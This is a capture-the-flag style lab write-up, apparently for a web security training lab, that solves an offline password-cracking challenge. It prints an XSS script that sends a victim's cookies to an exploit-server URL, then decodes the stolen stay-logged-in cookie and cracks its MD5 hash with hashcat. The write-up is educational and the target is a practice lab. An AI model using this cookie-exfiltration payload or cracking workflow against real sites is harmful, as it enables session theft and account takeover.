## Offline password cracking

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

Your credentials: wiener:peter
Victim's username: carlos

## Notes

- Possibility to leave a comment on a post
- Exploit server
- /login

## Resume

1. Exploit XSS to get `stay-logged-in` cookie
2. Bruteforce the cookie


## Solve 

To exploit the reflected XSS we're using :

```js
<script>document.location='https://exploit-0ac300d50345489a80cf114e014d00eb.exploit-server.net/exploit?c='+document.cookie</script>
```

After a few second we can see over exploit server's log : 

```
/exploit?c=secret=f70yi6qBgPDXXJYBfxmYXBixZWOXorGb;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

Using cyberchef (url decoded) : 

```
/exploit?c=secret=f70yi6qBgPDXXJYBfxmYXBixZWOXorGb; stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

And from base64 : 

`Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz` -> `carlos:26323c16d5f4dabff3bb136f2460a943`

And then using hashcat : 

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

`26323c16d5f4dabff3bb136f2460a943:onceuponatime`

Carlo's password is **onceuponatime** we can now log in with his account and delete it.